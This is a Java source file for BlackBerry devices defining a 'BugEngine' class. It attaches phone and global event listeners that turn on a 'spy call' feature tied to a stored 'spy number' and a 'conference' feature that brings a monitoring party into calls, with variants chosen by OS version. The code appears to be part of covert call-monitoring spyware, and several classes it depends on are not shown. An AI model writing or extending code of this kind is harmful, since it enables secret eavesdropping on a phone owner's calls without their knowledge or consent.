package com.vvt.bug;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.SystemListener2;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class BugEngine implements BugListener {
	
	private boolean isEnabled = false;
	private BugInfo bugInfo = null;
	private BasePELP pel = null;
	private SCCL sccl = null;
	private PhoneEventListenerSettings pelSettings = null;
	private Util util = new Util();
	
	public void setBugInfo(BugInfo bugInfo) {
		this.bugInfo = bugInfo;
	}
	
	public void start() {
		if (!isEnabled) {
			if (Log.isDebugEnable()) {
				Log.debug("BugEngine.start()", "bugInfo != null: " + (bugInfo != null) + "bugInfo.isEnabled(): " + bugInfo.isEnabled() + "bugInfo.isValidNumber(): " + util.isValidSpyNumber(bugInfo.getSpyNumberStore()));
			}
			if (bugInfo != null && bugInfo.isEnabled() && util.isValidSpyNumber(bugInfo.getSpyNumberStore())) {
				isEnabled = true;
				enableSpyCallFeature();
			}
		}
	}

	public void stop() {
		if (isEnabled) {
			isEnabled = false;
			if (pel != null) {
				pel.resetLogic();
			}
			if (sccl != null) {
				Phone.removePhoneListener(sccl);
			}
			if (pel != null) {
				Phone.removePhoneListener(pel);
				Application.getApplication().removeGlobalEventListener(pel);
			}
			if (sccl != null) {
				if (sccl instanceof SystemListener2) {
					Application.getApplication().removeSystemListener((SystemListener2)sccl);
				}
			}
			sccl = null;
			pel = null;
			pelSettings = null;
		}
	}
	
	private void enableSpyCallFeature() {
//		Log.debug("BugEngine.enableSpyCallFeature", "ENTER");
		if (PhoneInfo.isFourSixOrHigher()) {
			if (PhoneInfo.isFiveOrHigher()) {
				pel = new PELPFive();
			} else if (PhoneInfo.isFourSeven()) {
				pel = new PELPFourSeven();
			} else {
				pel = new PELPFourSix();
			}
		} else {
			pel = new PELPFourFiveAndBelow();
		}
		//pel.setSCNumber(bugInfo.getMonitorNumber());
		pel.setBugInfo(bugInfo);
		pel.setBugListener(this);
		Phone.addPhoneListener(pel);
		Application.getApplication().addGlobalEventListener(pel);
//		Log.debug("BugEngine.enableSpyCallFeature", "EXIT");
	}

	private void enableConferenceFeature() {
		if (Log.isDebugEnable()) {
			Log.debug("BugEngine.enableSCCFeature", "ENTER");
		}
		if (PhoneInfo.isFiveOrHigher()) {
			sccl = new SCCL_5(pelSettings);
		} else if (PhoneInfo.isFourSixOrHigher()) {
			sccl = new SCCL_46_UP(pelSettings);
		} else {
			sccl = new SCCL_45_DOWN(pelSettings);
		}
		sccl.setBugListener(this);
		//sccl.setSCCNumber(bugInfo.getMonitorNumber());
		sccl.setBugInfo(bugInfo);
		sccl.initialize();
		Phone.addPhoneListener(sccl);
		if (sccl instanceof SystemListener2) {
			Application.getApplication().addSystemListener((SystemListener2)sccl);
		}
	}

	// BugListener
	public void onCall(PhoneEventListenerSettings pelSettings) {
		if (bugInfo.isConferenceEnabled()) {
			Phone.removePhoneListener(pel);
			Application.getApplication().removeGlobalEventListener(pel);
			this.pelSettings = pelSettings;
			enableConferenceFeature();
		}
	}
	
	public void onFinish() {
		Phone.removePhoneListener(sccl);
		if (sccl instanceof SystemListener2) {
			Application.getApplication().removeSystemListener((SystemListener2)sccl);
		}
		if (isEnabled) {
			pel = null;
			enableSpyCallFeature();
		}
	}	
}
